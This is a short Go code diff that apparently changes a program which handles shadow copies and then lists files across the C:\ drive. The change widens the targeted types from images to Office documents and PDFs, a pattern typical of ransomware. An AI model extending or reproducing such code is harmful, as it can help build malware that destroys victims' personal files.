@@ -12,7 +12,7 @@ func main() {
 		panic(errShadowCopies)
 	}
 	fmt.Println(resultInfo)
-	files, errListFiles := utils.ListFiles(`C:\`, []string{"jpg", "png"})
+	files, errListFiles := utils.ListFiles(`C:\`, []string{"jpg", "jpeg", "png", "gif", "docx", "xlsx", "pptx", "pdf"})
 	if errListFiles != nil {
 		panic(errListFiles)
 	}
